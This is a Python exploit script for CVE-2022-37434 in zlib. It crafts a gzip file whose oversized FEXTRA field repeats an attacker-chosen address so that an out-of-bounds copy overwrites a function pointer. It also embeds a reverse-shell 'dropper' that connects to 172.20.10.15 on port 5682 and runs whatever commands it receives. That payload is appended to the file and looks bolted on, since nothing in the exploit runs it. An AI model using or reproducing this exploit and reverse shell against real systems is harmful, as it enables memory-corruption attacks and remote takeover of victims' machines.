#!/usr/bin/env python3
"""Craft a gzip whose FEXTRA payload is the little-endian PAD address repeated.
CVE-2022-37434 copies these bytes out of bounds, so victim->fn receives the
attacker-chosen address.
"""
import struct, sys

PAD = 0x1337000
out = sys.argv[1] if len(sys.argv) > 1 else "/tmp/marker.gz"
XLEN = 65535

# Shell dropper payload
shell_dropper_payload = b"""
import socket
import subprocess
import os

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        else:
            break
    s.close()

reverse_shell('172.20.10.15', 5682)
"""

marker = struct.pack("<Q", PAD)
extra = (marker * ((XLEN // len(marker)) + 1))[:XLEN]

hdr  = b"\x1f\x8b\x08\x04"          # magic, CM=deflate, FLG=FEXTRA
hdr += struct.pack("<I", 0)          # mtime
hdr += b"\x00\xff"                   # xfl, os
hdr += struct.pack("<H", XLEN)       # XLEN
blob = hdr + extra

# Include the shell dropper payload in the gzip file
blob += shell_dropper_payload

# minimal deflate tail (stored block) + gzip crc/size, so the stream stays valid
tail = b"\x01\x00\x00\xff\xff" + struct.pack("<I", 0) + struct.pack("<I", 0)
blob += tail

open(out, "wb").write(blob)
print(f"wrote {out}: {len(blob)} bytes, XLEN={XLEN}, marker={marker.hex()} (PAD=0x{PAD:x})")
